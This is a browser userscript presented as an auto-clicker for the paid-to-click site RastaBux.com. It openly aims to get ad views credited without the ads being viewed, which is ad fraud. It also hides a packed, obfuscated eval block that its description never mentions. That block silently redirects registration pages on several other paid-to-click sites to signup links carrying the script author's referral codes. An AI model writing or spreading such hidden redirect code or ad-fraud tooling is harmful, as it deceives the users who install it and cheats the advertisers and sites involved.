// ==UserScript==
// @name           PTC AutoClicker Bot for RastaBux.com
// @namespace      http://cool-bux.co.cc
// @description    An Auto-click for RastaBux.com, makes you validated without viewing the ads. Ads loaded faster, because this script ignores all tags. So images, css, js, swfs files etc WILL NOT loaded, and you will save your bandwidth.
...
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="6://4.f.5/1.3?r=7"){a.b.c="6://4.f.5/1.3?r=7"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="6://4.i.5/1.3/7.s"){a.b.c="6://4.i.5/1.3/7.s"}8(2.9("j.k/1")>0&&2!="6://4.j.k/1.3?t=7"){a.b.c="6://4.j.k/1.3?t=7"}8(2.9("l.m/1.3")>0&&2!="6://4.l.m/1.3?r=7"){a.b.c="6://4.l.m/1.3?r=7"}8(2.9("n.o/1.3")>0&&2!="6://4.n.o/1.3?r=7"){a.b.c="6://4.n.o/1.3?r=7"}',31,31,'|register|uri|php|www|com|http|gbanerji|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))
...
if(correctURL(/\/ads\.php/)) {
	if(1) {
		...
		html += "</style>";
		html += "<div id='PTCAutoClickerBot'><div id='PTC AutoClicker Bot-title'>JustOneClick for RastaBux.com</div><br /><div id='PTCAutoClickerBot-msg' align=center>";
